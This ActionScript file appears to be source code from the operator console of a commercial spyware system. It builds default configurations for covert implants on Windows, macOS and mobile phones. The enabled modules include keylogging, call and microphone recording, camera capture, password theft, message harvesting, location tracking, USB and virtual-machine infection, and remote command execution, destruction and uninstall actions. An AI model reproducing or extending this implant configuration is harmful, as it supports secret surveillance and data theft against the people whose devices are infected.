package it.ht.rcs.console
{
  import it.ht.rcs.console.agent.model.Agent;
  import it.ht.rcs.console.utils.Size;
  
  import mx.collections.ArrayCollection;
  import mx.formatters.DateFormatter;
  
  public class DefaultConfigBuilder
  {
    
    public static const FOREVER_DATE:String = '2100-01-01 00:00:00';
    
    private static var agent:Agent;
    
    private static const formatter:DateFormatter = new DateFormatter();
    private static var today:Date;
    
    public static function getDefaultConfigAsString(a:Agent):String
    {
      return JSON.stringify(getDefaultConfig(a));
    }
      
    public static function getDefaultConfig(a:Agent):Object
    {
      formatter.formatString = "YYYY-MM-DD 00:00:00";
      today = new Date();
      
      agent = a;
      
      var config:Object = {};
      config.modules = getModules();
      config.events  = [{ desc: "SYNC", event: "timer", subtype: "loop", repeat: 0, delay: 600, ts: "00:00:00", te: "23:59:59", enabled: true }];
      config.actions = [{ desc: "SYNC", subactions: [ getDefaultAction('synchronize') ] }];
      config.globals = getGlobals();
      
      return config;
    }
    
    public static function getModules(skipFilter:Boolean=false):Array
    {
      
      var modules:Array = [
        {
          module: "addressbook",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "application",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "calendar",
          _type: "desktop,mobile",
          _platform: "osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "call",
          buffer: 512000,
          compression: 5,

          record: true,
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "camera",
          quality: "med",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,winmo,symbian"
        },
        
        {
          module: "chat",
          _type: "desktop,mobile",
          _platform: "windows,osx,blackberry"
        },
        
        {
          module: "clipboard",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,android"
        },
        
        {
          module: "conference",
          number: "",
          _type: "mobile",
          _platform: "winmo"
        },
        
        {
          module: "crisis",
          network: {enabled: false, processes: []},
          hook:    {enabled: true,  processes: []},
          
          mic:         true,
          call:        true,
          camera:      true,
          position:    true,
          synchronize: false,
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,android,symbian"
        },
        
        {
          module: "device",
          list: false,
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "file",
          open:    false,
          capture: false,
          minsize: 1,
          maxsize: 500000,
          date: formatter.format(today),
          accept: [],
          deny:   [],
          _type: "desktop",
          _platform: "windows,osx"
        },
        
        {
          module: "infection",
          local:  false,
          mobile: false,
          usb:    false,
          vm: 0,
          factory: "",
          _type: "desktop",
          _platform: "windows"
        },
        
        {
          module: "keylog",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios"
        },
        
        {
          module: "livemic",
          number: "",
          _type: "mobile",
          _platform: "winmo"
        },
        
        {
          module: "messages",
          mail: {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE, maxsize: 100000}},
          sms:  {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE}},
          mms:  {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE}},
          _type: "desktop,mobile",
          _platform: "windows,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "mic",
          threshold: 0.22,
          silence: 5,
          autosense: false,
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "mouse",
          width: 50,
          height: 50,
          _type: "desktop",
          _platform: "windows,osx"
        },
        
        {
          module: "password",
          _type: "desktop,mobile",
          _platform: "windows,symbian"
        },
        
        {
          module: "position",
          gps:  false,
          cell: true,
          wifi: true,
          _type: "desktop,mobile",
          _platform: "windows,osx,blackberry,winmo,symbian,android"
        },
        
        {
          module: "print",
          quality: "med",
          _type: "desktop",
          _platform: "windows"
        },
        
        {
          module: "screenshot",
          onlywindow: false,
          quality: "med",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "url",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo"
        }
      ];
      
      if (skipFilter) return modules;
      
      var ac:ArrayCollection = new ArrayCollection(modules);
      ac.filterFunction = moduleFilterFunction;
      ac.refresh();
      
      var filteredModules:Array = ac.toArray();
      for each (var m:Object in filteredModules) {
        delete m._type;
        delete m._platform;
      }
      
      return filteredModules;
      
    }
    
    private static function moduleFilterFunction(item:Object):Boolean
    {
      return item._type.indexOf(agent.type) !=  -1;
    }
    
    private static function getGlobals():Object
    {
      var min:Number = agent.type == 'desktop' ? 1000 * Size.MIB : 100 * Size.MIB; // 1 GB, 100 MB
      var max:Number = agent.type == 'desktop' ? 4000 * Size.MIB : 100 * Size.MIB; // 4 GB, 100 MB
      var globals:Object = {
                             quota: { min: min, max: max },
                             wipe: false,
                             remove_driver: true,
                             nohide: [],
                             type: agent.type,
                             advanced: false,
                             collapsed: false,
                             migrated: false,
                             version: 2012041601
                           };
      
      return globals;
      
    }
    
    public static function getDefaultAction(name:String):Object
    {
      var action:String = name.toLowerCase();
      var a:Object;
      
      switch (action) {
        
        case 'synchronize':
          a = { action: "synchronize",
                host: "",
                bandwidth: 500000,
                mindelay: 0,
                maxdelay: 0,
                stop: false,
                
                wifi: true,
                cell: false }; // apn: { name: "", user: "", pass: "" }
          return a;
          
        case 'log':
          a = { action: "log",
                text: "" };
          return a;
          
        case 'execute':
          a = { action: "execute",
                command: "" };
          return a;
          
        case 'uninstall':
          a = { action: "uninstall" };
          return a;
          
        case 'destroy':
          a = { action: "destroy",
                permanent: false };
          return a;
          
        case 'sms':
          a = { action: "sms",
                number: "",
                text: "",
                position: false,
                sim: false };
          return a;
          
        default:
          return null;
      }
    }
    
    public static function getDefaultEvent(name:String):Object
    {
      var event:String = name.toLowerCase();
      var e:Object;
      
      switch (event) {
        
        case 'ac':
          e = { event: "ac" };
          break;
        
        case 'afterinst':
          e = { event: "afterinst",
                days: 1 };
          break;
          
        case 'battery':
          e = { event: "battery",
                min: 0,
                max: 30 };
          break;
          
        case 'call':
          e = { event: "call",
                number: "" };
          break;
          
        case 'connection':
          e = { event: "connection",
                ip: "0.0.0.0",
                netmask: "0.0.0.0",
                port: 0 };
          break;
          
        case 'date':
          e = { event: "date",
                datefrom: formatter.format(new Date()) };
          break;
          
        case 'position':
          e = { event: "position",
                type: "cell",
                latitude:  0,
                longitude: 0,
                distance:  0,
                country:   0,
                network:   0,
                area:      0,
                cellId:    0 };
          
        case 'process':
          e = { event: "process",
                process: "",
                focus:  false,
                window: false };
          break;
          
        case 'quota':
          e = { event: "quota",
                quota: 100000000 };
          break;
          
        case 'screensaver':
          e = { event: "screensaver" };
          break;
        
        case 'simchange':
          e = { event: "simchange" };
          break;
          
        case 'sms':
          e = { event: "sms",
                number: "",
                text: "" };
          break;
          
        case 'standby':
          e = { event: "standy" };
          break;
          
        case 'timer':
          e = { event: "timer",
                subtype: "loop",
                ts: "00:00:00",
                te: "23:59:59" };
          break;
          
        case 'window':
          e = { event: "window" };
          break;
          
        case 'winevent':
          e = { event: "window",
                id: 0,
                source: "" };
          break;
          
        default:
          e = null;
          break;
      }
      
      e.enabled = true;
      
      return e;
    }
    
    public static function cleanPlatformConfig(platform:String, config:Object):void
    {
      var modules:Array = DefaultConfigBuilder.getModules(true);
      
//      for (var i:int = 0; i < config.modules.length; i++) {
//        var module:Object = config.modules[i];
//        if (!moduleIsSupported(platform, module.module, modules)) {
//          config.modules.splice(config.modules.indexOf(module), 1);
//          deleteModuleReferences(config, module.module);
//          i--;
//        }
//      }
      for each (var module:Object in modules) {
       // trace("module: "+module.module+"> is supported? "+moduleIsSupported(platform, module.module, modules))
        if (!moduleIsSupported(platform, module.module, modules)) {
          //config.modules.splice(config.modules.indexOf(module), 1);
          deleteModuleReferences(config, module.module);
         
        }
      }
    }
    
    public static function addMissingModules(platform:String, config:Object):void
    {
      config.modules=[]
      var modules:Array = DefaultConfigBuilder.getModules(true);
      for each (var module:Object in modules) {
        
        if (moduleIsSupported(platform, module.module, modules)) {
         //do something
          
          config.modules.push(module)
        }
      }
    }
    
    private static function moduleIsSupported(platform:String, moduleName:String, modules:Array):Boolean
    {
      for each (var module:Object in modules)
        if (module.module == moduleName)
          return module._platform.indexOf(platform) != -1;
      return false;
    }
    
    private static function deleteModuleReferences(config:Object, moduleName:String):void
    {
      for (var i:int = 0; i < config.modules.length; i++) {
        var module:Object = config.modules[i];
        if (module.module == moduleName) {
          config.modules.splice(config.modules.indexOf(module), 1);
          i--;
        }
      }
      
      for each (var action:Object in config.actions)
        for (i = 0; i < action.subactions.length; i++) {
          var subaction:Object = action.subactions[i];
          if (subaction.action == 'module' && subaction.module == moduleName) {
            action.subactions.splice(action.subactions.indexOf(subaction), 1);
            i--;
          }
        }
    }
    
  }
  
}